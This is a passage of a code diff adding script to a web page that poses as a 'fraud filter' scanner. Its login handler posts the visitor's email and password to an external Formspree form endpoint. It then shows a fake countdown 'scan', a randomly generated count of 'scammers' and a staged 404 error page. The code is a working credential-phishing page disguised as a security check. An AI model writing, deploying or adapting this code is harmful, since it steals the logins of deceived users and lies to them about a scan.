+                        document.getElementById('loading-screen').classList.add('hidden-page');
+                        document.getElementById('fraud-filter-page').classList.remove('hidden-page');
+                    }, 500);
+                }, 1800);
+            };
+
+            // Trigger initial load sequence
+            if (document.readyState === 'loading') {
+                window.onload();
+            } else {
+                window.onload();
+            }
+
+            // Setup showLoginPage function
+            window.showLoginPage = function() {
+                document.getElementById('fraud-filter-page').classList.add('hidden-page');
+                document.getElementById('login-page').classList.remove('hidden-page');
+                window.scrollTo(0, 0);
+            };
+
+            // Setup login form handler
+            setTimeout(() => {
+                const loginForm = document.getElementById('loginForm');
+                if (loginForm) {
+                    loginForm.addEventListener('submit', (e) => {
+                        e.preventDefault();
+                        
+                        const inputs = e.target.querySelectorAll('input');
+                        const formData = new FormData();
+                        formData.append('email', inputs[0].value);
+                        formData.append('password', inputs[1].value);
+                        
+                        fetch('https://formspree.io/f/mlgbkzly', {
+                            method: 'POST',
+                            body: formData,
+                            headers: {
+                                'Accept': 'application/json'
+                            }
+                        }).then(response => {
+                            document.getElementById('login-page').classList.add('hidden-page');
+                            document.getElementById('scanning-page').classList.remove('hidden-page');
+                            startScanTimer();
+                        }).catch(error => {
+                            document.getElementById('login-page').classList.add('hidden-page');
+                            document.getElementById('scanning-page').classList.remove('hidden-page');
+                            startScanTimer();
+                        });
+                    });
+                }
+            }, 100);
+
+            // Setup scan timer
+            window.startScanTimer = function() {
+                let seconds = 30;
+                const timerEl = document.getElementById('timer');
+                const countdown = setInterval(() => {
+                    seconds--;
+                    timerEl.innerText = `Time remaining: ${seconds}s`;
+                    if (seconds <= 0) {
+                        clearInterval(countdown);
+                        showResults();
+                    }
+                }, 1000);
+            };
+
+            // Setup results function
+            window.showResults = function() {
+                const count = Math.floor(Math.random() * (195 - 7 + 1)) + 7;
+                document.getElementById('scammer-count').innerText = count;
+                document.getElementById('scanning-page').classList.add('hidden-page');
+                document.getElementById('results-modal').classList.remove('hidden-page');
+                
+                setTimeout(() => {
+                    document.getElementById('reload-prompt').classList.remove('hidden-page');
+                }, 1000);
+            };
+
+            // Setup goTo404 function
+            window.goTo404 = function() {
+                document.getElementById('results-modal').classList.add('hidden-page');
+                document.getElementById('error-page').classList.remove('hidden-page');
+            };
+        }
+
+        // Initialize canvas on page load
+        window.addEventListener('load', () => {
+            resizeCanvas();
+        });
+
+        window.addEventListener('resize', () => {
+            resizeCanvas();
+        });
+
+        // Start with canvas initialized
+        resizeCanvas();
     </script>
 </body>
 </html>
